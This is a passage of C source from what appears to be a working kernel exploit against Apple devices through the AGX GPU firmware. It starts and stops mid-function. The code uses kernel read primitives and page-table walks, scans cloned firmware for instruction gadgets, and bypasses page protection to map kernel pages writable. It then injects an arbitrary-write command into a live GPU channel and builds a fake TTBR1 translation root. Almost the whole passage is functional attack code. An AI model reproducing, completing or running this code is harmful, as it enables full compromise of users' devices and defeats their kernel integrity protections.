    volatile uint8_t pt67 = p67[0];
    kwlog("[resolve] pre-touch p67[0] = 0x%02x OK\n", pt67);

    kwlog("[resolve] reading 8 bytes from p67 (page 22)...\n");
    uint64_t v61 = 0;
    for (int i = 0; i < 8; i++) v61 |= ((uint64_t)p67[i]) << (i * 8);
    kwlog("[resolve] v61 = 0x%llx\n", (unsigned long long)v61);

    if (v64 == 0 || v61 == 0) {
        kwlog("[resolve] BAIL: v64=0x%llx v61=0x%llx -- firmware read returned 0\n",
                (unsigned long long)v64, (unsigned long long)v61);
        return -5;
    }

    kwlog("[resolve] pte_scan_for_physaddr(v64=0x%llx)...\n", (unsigned long long)v64);
    uint64_t kva1 = pte_scan_for_physaddr(v64);
    if (kva1 == 0) {
        kwlog("[resolve] FAIL: pte_scan_for_physaddr(v64=0x%llx) = 0 (no kernel mapping)\n",
                (unsigned long long)v64);
        return -3;
    }
    kwlog("[resolve] pte_scan(v64=0x%llx) -> KVA 0x%llx -> v4[32]\n",
            (unsigned long long)v64, (unsigned long long)kva1);

    kwlog("[resolve] pte_scan_for_physaddr(v61=0x%llx)...\n", (unsigned long long)v61);
    uint64_t kva2 = pte_scan_for_physaddr(v61);
    if (kva2 == 0) {
        kwlog("[resolve] FAIL: pte_scan_for_physaddr(v61=0x%llx) = 0 (no kernel mapping)\n",
                (unsigned long long)v61);
        return -4;
    }
    kwlog("[resolve] pte_scan(v61=0x%llx) -> KVA 0x%llx -> v4[74]\n",
            (unsigned long long)v61, (unsigned long long)kva2);

    g_agx_fw.ptr_post_qw_val = v64;
    g_agx_fw.ptr_post_qw_pa  = kva1;
    g_agx_fw.ptr_v48_7_val   = v61;
    g_agx_fw.ptr_v48_7_pa    = kva2;
    kwlog("[resolve] === OK ===\n");
    return 0;
}

#pragma mark - resolve: scan clone for 4-insn pattern, ADRP+LDR resolve, kread (binary lines 977-1001)

int kread_ptr_by_firmware_vaddr(uint64_t target_vaddr, uint64_t *out_ptr) {
    uint64_t kpm = g_agx_fw.firmware_kptr_mask;
    uint64_t kva_preamble = g_agx_fw.firmware_pa_kva;
    uint64_t off_va       = g_agx_fw.firmware_kva_off;
    uint64_t fn_vaddr     = g_agx_fw.firmware_vaddr;
    uint64_t fn_size      = g_agx_fw.firmware_func_size;
    uint64_t kva_function = g_agx_fw.ptr_post_qw_pa;

    uint64_t resolved_kva = 0;
    if (target_vaddr >= kpm && target_vaddr < kpm + off_va) {
        resolved_kva = (target_vaddr - kpm) + kva_preamble;
    } else if (target_vaddr >= fn_vaddr && target_vaddr < fn_vaddr + fn_size) {
        resolved_kva = (target_vaddr - fn_vaddr) + kva_function;
    } else {
        kwlog("[krv] target 0x%llx not in preamble [0x%llx, 0x%llx) nor func [0x%llx, 0x%llx)\n",
                (unsigned long long)target_vaddr,
                (unsigned long long)kpm, (unsigned long long)(kpm + off_va),
                (unsigned long long)fn_vaddr, (unsigned long long)(fn_vaddr + fn_size));
        return -1;
    }

    if (kread_qword(resolved_kva, out_ptr) != 0) {
        kwlog("[krv] kread(0x%llx) failed\n", (unsigned long long)resolved_kva);
        return -2;
    }
    return 0;
}

static uint32_t *scan_clone_for_pattern(const uint32_t *pattern,
                                         const uint32_t *mask,
                                         long count) {
    if (!g_agx_fw.clone_user_va || count <= 0) return NULL;
    uint32_t *base = (uint32_t *)(uintptr_t)g_agx_fw.clone_user_va;
    uint32_t *end  = (uint32_t *)((uintptr_t)g_agx_fw.clone_user_va + g_agx_fw.clone_size);
    for (uint32_t *p = base; p < end; p++) {
        if ((mask[0] & *p) != pattern[0]) continue;
        if (p + count > end) return NULL;
        int ok = 1;
        for (long j = 1; j < count; j++) {
            if ((mask[j] & p[j]) != pattern[j]) { ok = 0; break; }
        }
        if (ok) return p;
    }
    return NULL;
}

int agx_resolve_adrp_ldr(void) {
    kwlog("[resolve] === clone pattern scan + ADRP+LDR resolve ===\n");

    if (!g_agx_fw.clone_user_va) {
        kwlog("[resolve] FAIL: clone not present (need firmware clone)\n");
        return -1;
    }

    static const uint32_t pat[4]  = {0x528007C5u, 0x94000000u, 0x90000000u, 0xF9000000u};
    static const uint32_t msk[4]  = {0xFFFFFFFFu, 0xFC000000u, 0x9F000000u, 0xFFC0001Fu};

    uint32_t *match = scan_clone_for_pattern(pat, msk, 4);
    if (!match) {
        kwlog("[resolve] FAIL: 4-insn pattern not found in clone\n");
        g_agx_fw.v43 = 0;
        return -2;
    }
    uint64_t match_off  = (uintptr_t)match - g_agx_fw.clone_user_va;
    uint64_t match_va   = g_agx_fw.firmware_kptr_mask + match_off;
    uint32_t insn2      = match[2];
    uint32_t insn3      = match[3];
    uint64_t adrp_pc    = match_va + 8;
    kwlog("[resolve] match at clone+0x%llx (firmware VA 0x%llx)\n",
            (unsigned long long)match_off, (unsigned long long)match_va);
    kwlog("[resolve] insn[2]=0x%08x (ADRP) insn[3]=0x%08x (LDR/ADD)\n", insn2, insn3);

    int64_t immhi = (int64_t)((insn2 >> 5) & 0x7FFFFu);
    int64_t immlo = (int64_t)((insn2 >> 29) & 0x3u);
    int64_t imm21 = (immhi << 2) | immlo;
    if (imm21 & 0x100000LL) imm21 |= ~0xFFFFFLL;
    int64_t adrp_off = imm21 << 12;

    uint64_t imm12 = (insn3 >> 10) & 0xFFF;
    int shift = (insn3 & 0x40000000) ? 3 : 2;
    uint64_t ldr_off = imm12 << shift;

    uint64_t target_va = (adrp_pc & ~0xFFFULL) + adrp_off + ldr_off;
    kwlog("[resolve] adrp_pc=0x%llx adrp_off=0x%llx ldr_off=0x%llx (shift=%d)\n",
            (unsigned long long)adrp_pc,
            (unsigned long long)adrp_off,
            (unsigned long long)ldr_off, shift);
    kwlog("[resolve] resolved target firmware VA = 0x%llx\n",
            (unsigned long long)target_va);

    uint64_t fetched = 0;
    int r = kread_ptr_by_firmware_vaddr(target_va, &fetched);
    if (r != 0) {
        kwlog("[resolve] FAIL: kread_ptr_by_firmware_vaddr -> %d\n", r);
        g_agx_fw.v43 = 0;
        return -3;
    }
    kwlog("[resolve] *target = 0x%llx\n", (unsigned long long)fetched);

    if (fetched == 0xFFFFFFFFFFFFFFB8ULL ) {
        kwlog("[resolve] FAIL: fetched == -72 (binary bail condition)\n");
        g_agx_fw.v43 = fetched + 72;
        return -4;
    }

    g_agx_fw.v43 = fetched + 72;
    kwlog("[resolve] v4[43] = 0x%llx (= *target + 72)\n",
            (unsigned long long)g_agx_fw.v43);
    kwlog("[resolve] === OK ===\n");
    return 0;
}

#pragma mark - resolve: scan clone for 3 specific values (binary lines 1003-1051)

int agx_resolve_clone_scans(void) {
    kwlog("[resolve] === clone scans for v4[44]/v4[45]/v4[46] ===\n");

    if (!g_agx_fw.clone_user_va) {
        kwlog("[resolve] FAIL: clone not present\n");
        return -1;
    }

    const int32_t  *clone32 = (const int32_t *)(uintptr_t)g_agx_fw.clone_user_va;
    long total_i32 = (long)(g_agx_fw.clone_size / 4);
    uint64_t kpm   = g_agx_fw.firmware_kptr_mask;

    long idx_step3 = -1;
    for (long i = 0; i < total_i32; i++) {
        if (clone32[i] == (int32_t)0xD53BD061) { idx_step3 = i; break; }
    }
    if (idx_step3 < 0 || idx_step3 + 1 >= total_i32) {
        kwlog("[resolve] FAIL step 3: 0xD53BD061 (MRS X1, TPIDR_EL0) not found\n");
        g_agx_fw.v44_kva = 0;
        return -2;
    }
    g_agx_fw.v44_kva = kpm + (uint64_t)idx_step3 * 4;
    kwlog("[resolve] step 3: idx=%ld -> v4[44] = firmware VA 0x%llx\n",
            idx_step3, (unsigned long long)g_agx_fw.v44_kva);

    static const uint32_t pat4[2] = {0xF8226801u, 0xD65F03C0u};
    static const uint32_t msk4[2] = {0xFFFFFFFFu, 0xFFFFFFFFu};
    uint32_t *m4 = scan_clone_for_pattern(pat4, msk4, 2);
    if (!m4) {
        kwlog("[resolve] FAIL step 4: 'STR X1,[X0,X2];RET' pattern not found\n");
        g_agx_fw.v45_kva = 0;
        return -3;
    }
    uint64_t off4 = (uintptr_t)m4 - g_agx_fw.clone_user_va;
    g_agx_fw.v45_kva = kpm + off4;
    kwlog("[resolve] step 4: pattern at clone+0x%llx -> v4[45] = firmware VA 0x%llx\n",
            (unsigned long long)off4, (unsigned long long)g_agx_fw.v45_kva);

    long idx_step5 = -1;
    for (long i = 0; i < total_i32; i++) {
        if (clone32[i] == (int32_t)0x910443E1) { idx_step5 = i; break; }
    }
    if (idx_step5 < 0) {
        kwlog("[resolve] FAIL step 5: 0x910443E1 (ADD X1, SP, #0x110) not found\n");
        g_agx_fw.v46_kva = 0;
        return -4;
    }
    g_agx_fw.v46_kva = kpm + (uint64_t)idx_step5 * 4;
    kwlog("[resolve] step 5: idx=%ld -> v4[46] = firmware VA 0x%llx\n",
            idx_step5, (unsigned long long)g_agx_fw.v46_kva);

    kwlog("[resolve] === OK ===\n");
    return 0;
}

static uint64_t s_fw_l1_kva[8] = {0};
static uint64_t s_fw_l2_pa  = 0;
static uint64_t s_fw_l2_kva = 0;

#pragma mark - resolve: PTE-walk cache + firmware-constant scans (zero-page / patterns / finalize)

static void agx_fw_pte_reset_cache(void) {
    for (int i = 0; i < 8; i++) s_fw_l1_kva[i] = 0;
    s_fw_l2_pa = 0;
    s_fw_l2_kva = 0;
}

static uint64_t agx_fw_pte_walk(uint64_t kva) {
    if (!g_agx_fw.ptr_v48_7_pa) return 0;

    uint64_t l0_idx = (kva >> 36) & 7;
    uint64_t l0_off = l0_idx * 8;
    uint64_t l0_pte = 0;
    if (kread_qword(g_agx_fw.ptr_v48_7_pa + l0_off, &l0_pte)) return 0;
    if ((l0_pte & 1) == 0) return 0;

    uint64_t l1_pa = l0_pte & 0xFFFFFFFFC000ULL;
    uint64_t l1_kva = s_fw_l1_kva[l0_idx];
    if (!l1_kva) {
        kwlog("[fwpt] L1 pte_scan L0[%llu] PA=0x%llx ...\n",
                (unsigned long long)l0_idx, (unsigned long long)l1_pa);
        l1_kva = pte_scan_for_physaddr(l1_pa);
        if (!l1_kva) return 0;
        s_fw_l1_kva[l0_idx] = l1_kva;
        kwlog("[fwpt] L1 KVA L0[%llu] = 0x%llx (PA 0x%llx)\n",
                (unsigned long long)l0_idx,
                (unsigned long long)l1_kva, (unsigned long long)l1_pa);
    }

    uint64_t l1_off = (kva >> 22) & 0x3FF8;
    uint64_t l1_pte = 0;
    if (kread_qword(l1_kva + l1_off, &l1_pte)) return 0;
    if ((l1_pte & 1) == 0) return 0;

    if ((l1_pte & 2) == 0) {
        return (l1_pte & 0xFFFFFFE000000ULL) | (kva & 0x1FFC000ULL);
    }

    uint64_t l2_pa = l1_pte & 0xFFFFFFFFC000ULL;
    if (s_fw_l2_pa != l2_pa) {
        kwlog("[fwpt] L2 pte_scan PA=0x%llx ...\n", (unsigned long long)l2_pa);
        s_fw_l2_kva = pte_scan_for_physaddr(l2_pa);
        if (!s_fw_l2_kva) {
            s_fw_l2_pa = 0;
            return 0;
        }
        s_fw_l2_pa = l2_pa;
        kwlog("[fwpt] L2 KVA = 0x%llx (PA 0x%llx)\n",
                (unsigned long long)s_fw_l2_kva, (unsigned long long)l2_pa);
    }

    uint64_t l2_off = (kva >> 11) & 0x3FF8;
    uint64_t l2_pte = 0;
    if (kread_qword(s_fw_l2_kva + l2_off, &l2_pte)) return 0;
    if ((l2_pte & 1) == 0) return 0;

    return l2_pte & 0xFFFFFFFFC000ULL;
}

int agx_resolve_zero_page(void) {
    kwlog("[resolve] === kernel zero-page scan ===\n");

    if (!g_agx_fw.v44_kva || !g_agx_fw.v45_kva || !g_agx_fw.v46_kva) {
        kwlog("[resolve] FAIL: prerequisites (v44/v45/v46) not set\n");
        return -1;
    }
    if (!g_agx_fw.ptr_v48_7_pa) {
        kwlog("[resolve] FAIL: ptr_v48_7_pa (v4[+0x250]) not set -- needed as L0 root\n");
        return -2;
    }
    kwlog("[resolve] using L0 table KVA = 0x%llx (firmware-provided)\n",
            (unsigned long long)g_agx_fw.ptr_v48_7_pa);

    const uint32_t page_size = (uint32_t)vm_page_size;
    if (page_size != 0x4000) {
        kwlog("[resolve] WARN: vm_page_size=0x%x (expected 0x4000)\n", page_size);
    }

    uint8_t *scratch = (uint8_t *)calloc(page_size, 1);
    if (!scratch) {
        kwlog("[resolve] FAIL: calloc(0x%x) returned NULL\n", page_size);
        return -3;
    }

    const uint64_t base = 0xFFFFFFA000020000ULL;
    const uint64_t end  = 0xFFFFFFA00008C000ULL;

    uint8_t bitfield[27];
    memset(bitfield, 0, sizeof(bitfield));

    agx_fw_pte_reset_cache();

    long mapped_count = 0;
    long unmapped_count = 0;
    long zero_count = 0;

    for (uint64_t kva = base; kva < end; kva += page_size) {
        size_t idx = (size_t)((kva - base) / page_size);

        uint64_t pa = agx_fw_pte_walk(kva);
        if (!pa) {
            bitfield[idx] = 0xFF;
            unmapped_count++;
            continue;
        }
        mapped_count++;

        ppl_page_t page = {0};
        int err = ppl_make_writable_page(pa & ~(uint64_t)(page_size - 1), &page);
        if (err) {
            kwlog("[resolve] FAIL: ppl_make_writable_page idx=%zu PA=0x%llx err=0x%x\n",
                    idx, (unsigned long long)pa, err);
            free(scratch);
            return -4;
        }

        volatile const uint8_t *mp = (volatile const uint8_t *)(uintptr_t)page.mapped_addr;
        (void)mp[0];

        if (memcmp((const void *)(uintptr_t)page.mapped_addr,
                   scratch,
                   page_size) == 0) {
            bitfield[idx] = 1;
            zero_count++;
        }

        ppl_writable_page_free(&page);
    }

    kwlog("[resolve] scan complete: mapped=%ld unmapped=%ld zero=%ld\n",
            mapped_count, unmapped_count, zero_count);

    char hex[27 * 3 + 1];
    char *hp = hex;
    for (int i = 0; i < 27; i++) {
        hp += snprintf(hp, 4, "%02x ", bitfield[i]);
    }
    kwlog("[resolve] bitfield: %s\n", hex);

    long selected_idx = -1;

    if (bitfield[13] == 1) {
        selected_idx = 13;
        kwlog("[resolve] decision: bitfield[13]==1, using idx 13\n");
    } else {
        for (int k = 0; k < 13; k++) {
            if (bitfield[14 + k] == 1) {
                selected_idx = 14 + k;
                kwlog("[resolve] decision: forward scan hit at idx %ld\n", selected_idx);
                break;
            }
        }
        if (selected_idx < 0) {
            for (int k = 12; k >= 1; k--) {
                if (bitfield[k] == 1) {
                    selected_idx = k;
                    kwlog("[resolve] decision: backward scan hit at idx %ld\n", selected_idx);
                    break;
                }
            }
        }
    }

    if (selected_idx < 0) {
        kwlog("[resolve] FAIL: no all-zero page in scan window\n");
        free(scratch);
        return -4;
    }

    uint64_t selected_kva = base + (uint64_t)selected_idx * page_size;
    free(scratch);

    g_agx_fw.zero_kva = selected_kva;
    kwlog("[resolve] === OK -- zero_kva = 0x%llx (idx %ld) ===\n",
            (unsigned long long)g_agx_fw.zero_kva, selected_idx);
    return 0;
}

int agx_resolve_pattern_kread(void) {
    kwlog("[resolve] === clone 5-insn pattern + LDR-literal kread ===\n");

    if (!g_agx_fw.clone_user_va || !g_agx_fw.firmware_kptr_mask) {
        kwlog("[resolve] FAIL: clone or kptr_mask missing\n");
        return -1;
    }

    static const uint32_t pat[5] = {
        0xD503201Fu,
        0x58000000u,
        0xD503201Fu,
        0x58000001u,
        0x14000000u
    };
    static const uint32_t msk[5] = {
        0xFFFFFFFFu,
        0xFF00001Fu,
        0xFFFFFFFFu,
        0xFF00001Fu,
        0xFC000000u
    };

    uint32_t *m = scan_clone_for_pattern(pat, msk, 5);
    if (!m) {
        kwlog("[resolve] FAIL: 5-insn pattern not found in clone\n");
        return -2;
    }

    uint64_t match_off    = (uintptr_t)m - g_agx_fw.clone_user_va;
    uint64_t match_vaddr  = g_agx_fw.firmware_kptr_mask + match_off;
    uint64_t ldr_pc       = match_vaddr + 4;
    uint32_t ldr_insn     = m[1];

    uint32_t imm19 = (ldr_insn >> 5) & 0x7FFFFu;
    int64_t byte_off;
    if (imm19 & 0x40000u) {
        byte_off = ((int64_t)(imm19 | 0xFFFFFFFFFFF80000ULL)) << 2;
    } else {
        byte_off = ((int64_t)imm19) << 2;
    }
    uint64_t literal_vaddr = ldr_pc + (uint64_t)byte_off;

    kwlog("[resolve] match @ clone+0x%llx -> firmware VA 0x%llx\n",
            (unsigned long long)match_off, (unsigned long long)match_vaddr);
    kwlog("[resolve] LDR insn=0x%08x imm19=0x%x byte_off=%lld -> literal VA 0x%llx\n",
            ldr_insn, imm19, (long long)byte_off, (unsigned long long)literal_vaddr);

    uint64_t literal_val = 0;
    int kr = kread_ptr_by_firmware_vaddr(literal_vaddr, &literal_val);
    if (kr) {
        kwlog("[resolve] FAIL: kread_ptr_by_firmware_vaddr(0x%llx) = %d\n",
                (unsigned long long)literal_vaddr, kr);
        return -3;
    }

    g_agx_fw.v51_kva = match_vaddr;
    g_agx_fw.v52_val = literal_val;

    kwlog("[resolve] v4[51] = firmware VA 0x%llx, v4[52] = pointer 0x%llx\n",
            (unsigned long long)g_agx_fw.v51_kva,
            (unsigned long long)g_agx_fw.v52_val);

    if (!g_agx_fw.v51_kva) {
        kwlog("[resolve] FAIL: v4[51] == 0\n");
        return -4;
    }
    if (!g_agx_fw.v52_val) {
        kwlog("[resolve] FAIL: v4[52] == 0\n");
        return -5;
    }

    kwlog("[resolve] === OK ===\n");
    return 0;
}

int agx_resolve_dsb_isb(void) {
    kwlog("[resolve] === DSB SY/ISB/RET + B(0) clone scans ===\n");

    if (!g_agx_fw.clone_user_va || !g_agx_fw.firmware_kptr_mask) {
        kwlog("[resolve] FAIL: clone or kptr_mask missing\n");
        return -1;
    }

    static const uint32_t pat3[3] = {0xD5033F9Fu, 0xD5033FDFu, 0xD65F03C0u};
    static const uint32_t msk3[3] = {0xFFFFFFFFu, 0xFFFFFFFFu, 0xFFFFFFFFu};

    uint32_t *m3 = scan_clone_for_pattern(pat3, msk3, 3);
    if (!m3) {
        kwlog("[resolve] FAIL: DSB SY/ISB/RET pattern not found in clone\n");
        return -2;
    }
    uint64_t off3 = (uintptr_t)m3 - g_agx_fw.clone_user_va;
    g_agx_fw.v53_kva = g_agx_fw.firmware_kptr_mask + off3;
    if (!g_agx_fw.v53_kva) {
        kwlog("[resolve] FAIL: v4[53] == 0\n");
        return -3;
    }
    kwlog("[resolve] DSB/ISB/RET @ clone+0x%llx -> v4[53] = firmware VA 0x%llx\n",
            (unsigned long long)off3, (unsigned long long)g_agx_fw.v53_kva);

    const uint32_t *p = (const uint32_t *)(uintptr_t)g_agx_fw.clone_user_va;
    long total_i32 = (long)(g_agx_fw.clone_size / 4);
    long b_idx = -1;
    for (long i = 0; i < total_i32; i++) {
        if (p[i] == 0x14000000u) { b_idx = i; break; }
    }
    if (b_idx < 0) {
        kwlog("[resolve] FAIL: no 0x14000000 (B 0) instruction in clone\n");
        return -4;
    }
    g_agx_fw.v54_kva = g_agx_fw.firmware_kptr_mask + (uint64_t)b_idx * 4;
    if (!g_agx_fw.v54_kva) {
        kwlog("[resolve] FAIL: v4[54] == 0\n");
        return -5;
    }
    kwlog("[resolve] B(0) @ clone+0x%lx -> v4[54] = firmware VA 0x%llx\n",
            b_idx * 4, (unsigned long long)g_agx_fw.v54_kva);

    kwlog("[resolve] === OK ===\n");
    return 0;
}

int agx_resolve_finalize(void) {
    kwlog("[resolve] === finalize + writable page handles ===\n");

    if (!g_agx_fw.zero_kva) {
        kwlog("[resolve] FAIL: zero_kva (v4[48]) not set\n");
        return -1;
    }

    g_agx_fw.v47_base  = 0xFFFFFFA000000000ULL;
    g_agx_fw.v49_const = 0xFFFFFF9100160000ULL;
    g_agx_fw.v50_const = 0xFFFFFF9100170000ULL;
    kwlog("[resolve] v4[47]=0x%llx v4[49]=0x%llx v4[50]=0x%llx\n",
            (unsigned long long)g_agx_fw.v47_base,
            (unsigned long long)g_agx_fw.v49_const,
            (unsigned long long)g_agx_fw.v50_const);

    if (g_agx_fw.clone_user_va) {
        kwlog("[resolve] vm_deallocate clone @ 0x%llx size 0x%llx\n",
                (unsigned long long)g_agx_fw.clone_user_va,
                (unsigned long long)g_agx_fw.clone_size);
        vm_deallocate(mach_task_self_,
                      (vm_address_t)g_agx_fw.clone_user_va,
                      (vm_size_t)g_agx_fw.clone_size);
        g_agx_fw.clone_user_va = 0;
        g_agx_fw.clone_size    = 0;
    }
    if (g_agx_fw.page_maps && g_agx_fw.page_count > 0) {
        for (long i = 0; i < g_agx_fw.page_count; i++) {
            if (g_agx_fw.page_maps[i].kobj_addr)
                ppl_writable_page_free(&g_agx_fw.page_maps[i]);
        }
        free(g_agx_fw.page_maps);
        g_agx_fw.page_maps = NULL;
        g_agx_fw.page_count = 0;
    }

    const uint32_t page_size = (uint32_t)vm_page_size;

    kwlog("[resolve] pte_prepare_writable_page zero_kva=0x%llx ...\n",
            (unsigned long long)g_agx_fw.zero_kva);
    uint64_t zero_pa = agx_fw_pte_walk(g_agx_fw.zero_kva);
    if (!zero_pa) {
        kwlog("[resolve] FAIL: fw_pte_walk(zero_kva) = 0\n");
        return -2;
    }
    int kr = ppl_make_writable_page(zero_pa & ~(uint64_t)(page_size - 1),
                                    &g_agx_fw.zero_wp_page);
    if (kr) {
        kwlog("[resolve] FAIL: ppl_make_writable_page(zero_pa) = 0x%x\n", kr);
        return -3;
    }
    g_agx_fw.zero_wp_mapped_va = g_agx_fw.zero_wp_page.mapped_addr;
    g_agx_fw.zero_wp_kva       = g_agx_fw.zero_kva;
    g_agx_fw.zero_wp_page_size = page_size;
    kwlog("[resolve] zero_kva 0x%llx -> PA 0x%llx -> user VA 0x%llx\n",
            (unsigned long long)g_agx_fw.zero_kva,
            (unsigned long long)zero_pa,
            (unsigned long long)g_agx_fw.zero_wp_mapped_va);

    kwlog("[resolve] pte_prepare_writable_page v47_base=0x%llx ...\n",
            (unsigned long long)g_agx_fw.v47_base);
    uint64_t base_pa = agx_fw_pte_walk(g_agx_fw.v47_base);
    if (!base_pa) {
        kwlog("[resolve] FAIL: fw_pte_walk(v47_base) = 0\n");
        ppl_writable_page_free(&g_agx_fw.zero_wp_page);
        return -4;
    }
    kr = ppl_make_writable_page(base_pa & ~(uint64_t)(page_size - 1),
                                &g_agx_fw.base_wp_page);
    if (kr) {
        kwlog("[resolve] FAIL: ppl_make_writable_page(base_pa) = 0x%x\n", kr);
        ppl_writable_page_free(&g_agx_fw.zero_wp_page);
        return -5;
    }
    g_agx_fw.base_wp_mapped_va = g_agx_fw.base_wp_page.mapped_addr;
    g_agx_fw.base_wp_kva       = g_agx_fw.v47_base;
    g_agx_fw.base_wp_page_size = page_size;
    kwlog("[resolve] v47_base 0x%llx -> PA 0x%llx -> user VA 0x%llx\n",
            (unsigned long long)g_agx_fw.v47_base,
            (unsigned long long)base_pa,
            (unsigned long long)g_agx_fw.base_wp_mapped_va);

    kwlog("[resolve] === OK ===\n");
    return 0;
}

static uint64_t g_r2c_pa[256], g_r2c_kva[256]; static int g_r2c_n=0, g_r2c_w=0;

#pragma mark - GPU-VA / PA -> userspace mapping helpers (route-2)

#define OIP_CACHE_N 768
static struct { uint64_t key; uint64_t ucpu; ppl_page_t pg; } g_oip_cache[OIP_CACHE_N];
static int g_oip_cache_n = 0;
static int g_oip_map_calls = 0;
static uint64_t oip_map_pa(uint64_t pa_page){
    for(int i=0;i<g_oip_cache_n;i++) if(g_oip_cache[i].key==pa_page) return g_oip_cache[i].ucpu;
    if(g_oip_cache_n>=OIP_CACHE_N) return 0;
    ppl_page_t pg={0}; g_oip_map_calls++;
    if(ppl_make_writable_page(pa_page,&pg)!=0 || !pg.mapped_addr) return 0;
    g_oip_cache[g_oip_cache_n].key=pa_page; g_oip_cache[g_oip_cache_n].ucpu=pg.mapped_addr; g_oip_cache[g_oip_cache_n].pg=pg;
    return g_oip_cache[g_oip_cache_n++].ucpu;
}
static uint64_t oip_map_gva(uint64_t gva){
    if(!gva || (gva>>32)!=0xffffffa0) return 0;
    uint64_t pa = agx_fw_pte_walk(gva);
    if(!pa || (pa>>32)!=0x8) return 0;
    uint64_t u = oip_map_pa(pa & ~0x3FFFULL);
    return u ? (u + (gva & 0x3FFF)) : 0;
}
static uint64_t oip_uva(uint64_t gva, uint32_t span){
    if(((gva & 0x3FFF) + span) > 0x4000) return 0;
    return oip_map_gva(gva);
}

#pragma mark - deliver: op-0f arbitrary-write into a live serviced channel -- CUSTOM

static int agx_op0f_arm(uint64_t ptr_ring, uint64_t ctrl, uint32_t size, uint64_t A, uint64_t V) {
    uint32_t last=0xffffffff;
    for(int s=0; s<40000; s++){
        uint64_t tw=0,tr=0; agx_kr64_dg(ctrl+0x40,&tw); agx_kr64_dg(ctrl,&tr);
        uint32_t cw=(uint32_t)tw,cr=(uint32_t)tr; if(((cw+size-cr)%size)<1) continue;
        if(cw==last) continue; last=cw;
        uint32_t idx=(cw+size-1)%size; uint64_t pe=0;
        if(agx_kr64_dg(ptr_ring+8*idx,&pe)!=0) continue; pe=AGX_KPTR_STRIP(pe);
        if(!pe||(pe>>32)!=0xffffffa0) continue;
        uint64_t ucur=oip_uva(pe+0x474,8); if(!ucur) continue;
        uint64_t cur=AGX_KPTR_STRIP(*(volatile uint64_t*)(uintptr_t)ucur);
        if(!cur||(cur>>32)!=0xffffffa0) continue;
        uint32_t to=0xffffffff;
        for(uint32_t o=0;o<0x800;o+=4){ uint64_t u=oip_uva(cur+o,4); if(!u) break; if(*(volatile uint32_t*)(uintptr_t)u==0x40000018){to=o;break;} }
        if(to==0xffffffff) continue;
        uint64_t inj=oip_uva(cur+to,0x60); if(!inj) continue;
        volatile uint8_t*pp=(volatile uint8_t*)(uintptr_t)inj;
        for(int i=0x3f;i>=0;i--) pp[0x14+i]=pp[i];
        *(volatile uint64_t*)(uintptr_t)(inj+0x04)=A;
        *(volatile uint64_t*)(uintptr_t)(inj+0x0c)=V;
        __asm__ volatile("dmb ish":::"memory");
        *(volatile uint32_t*)(uintptr_t)inj=0x2000000F;
        __asm__ volatile("dmb ish":::"memory");
        return 1;
    }
    return 0;
}

static uint64_t s_fake_ttbr1_pa = 0, s_self_ref_S = 0, s_leaf_attr = 0;

#pragma mark - deliver: build the fake TTBR1 (clone live root + self-ref branch)

static uint64_t agx_alloc_table_page(const char *tag, ppl_page_t *out_map) {
    const uint32_t ps = (uint32_t)vm_page_size; const uint64_t pm = (uint64_t)ps - 1;
    uint32_t got = 0; mach_port_t port = 0;
    uint64_t kva = kern_port_kobj_find_impl(ps, &got, &port);
    if (!kva) { kwlog("[ttbr1] FAIL alloc %s: kern_port_kobj_find\n", tag); return 0; }
    uint64_t pte = 0, pa = 0;
    if (kernel_pte_walk_full(kva & ~pm, NULL, &pte, &pa) || !(pte & 0xFFFFFFFFC000ULL)) {
        kwlog("[ttbr1] FAIL alloc %s: pte_walk kva=0x%llx\n", tag, (unsigned long long)kva); return 0; }
    pa = pte & 0xFFFFFFFFC000ULL;
    if (pa & pm)              { kwlog("[ttbr1] FAIL %s: PA 0x%llx not 16KB-aligned\n", tag, (unsigned long long)pa); return 0; }
    if (pa >= 0x1000000000ULL){ kwlog("[ttbr1] FAIL %s: PA 0x%llx >= IPS36 limit (must be <0x1000000000)\n", tag, (unsigned long long)pa); return 0; }
    if (pa >= 0x200000000ULL && pa < 0x280000000ULL) { kwlog("[ttbr1] FAIL %s: PA 0x%llx in GPU carveout\n", tag, (unsigned long long)pa); return 0; }
    int r = ppl_make_writable_page(pa, out_map);
    if (r || !out_map->mapped_addr) { kwlog("[ttbr1] FAIL %s: ppl_make_writable_page(0x%llx)=%d\n", tag, (unsigned long long)pa, r); return 0; }
    memset((void *)(uintptr_t)out_map->mapped_addr, 0, ps);
    __asm__ volatile("dsb ish" ::: "memory");
    kwlog("[ttbr1] alloc %s: kva=0x%llx PA=0x%llx user=0x%llx (zeroed)\n", tag,
          (unsigned long long)kva, (unsigned long long)pa, (unsigned long long)out_map->mapped_addr);
    return pa;
}

static int agx_build_fake_ttbr1(uint64_t witness_pa) {
    const uint64_t REAL_ROOT_PA = 0x8ffeec000ULL;
    const uint64_t T1BASE = 0xFFFFFF8000000000ULL;
    const uint64_t OA     = 0x3FFFFFFC000ULL;
    const uint32_t ps = (uint32_t)vm_page_size; const uint64_t pm = (uint64_t)ps - 1;
    kwlog("[ttbr1] === build fake TTBR1 (clone live root @0x%llx + self-ref branch) ===\n",
          (unsigned long long)REAL_ROOT_PA);

    uint64_t root_kva = pte_scan_for_physaddr(REAL_ROOT_PA);
    uint64_t L1[8] = {0}; int read_ok = 0, root_mapped = 0; ppl_page_t rootpg; memset(&rootpg, 0, sizeof(rootpg));
    if (root_kva) {
        read_ok = 1;
        for (int i = 0; i < 8; i++) { if (agx_kr64_dg(root_kva + 8*i, &L1[i]) != 0) { read_ok = 0; break; } }
        kwlog("[ttbr1] read live root via kread (reverse-map kva=0x%llx) ok=%d\n", (unsigned long long)root_kva, read_ok);
    }
    if (!read_ok) {
        kwlog("[ttbr1] reverse-map miss/blocked (kva=0x%llx) -> ppl_make_writable_page fallback (perm-7; a PANIC here = root is type-26 -> pivot to firmware-side read)\n", (unsigned long long)root_kva);
        int r = ppl_make_writable_page(REAL_ROOT_PA & ~pm, &rootpg);
        if (r || !rootpg.mapped_addr) { kwlog("[ttbr1] FAIL: cannot read live root (ppl=%d)\n", r); return -1; }
        root_mapped = 1;
        volatile uint64_t *rp = (volatile uint64_t *)(uintptr_t)rootpg.mapped_addr;
        for (int i = 0; i < 8; i++) L1[i] = rp[i];
        read_ok = 1;
    }
    int free_slot = -1;
    for (int i = 0; i < 8; i++) {
        int valid = (int)(L1[i] & 1), table = (int)((L1[i] >> 1) & 1);
        kwlog("[ttbr1]   L1[%d]=0x%016llx valid=%d %s nextPA=0x%llx\n", i, (unsigned long long)L1[i],
              valid, table ? "table" : "block", (unsigned long long)(L1[i] & OA));
        if (i >= 2 && !valid && free_slot < 0) free_slot = i;
    }
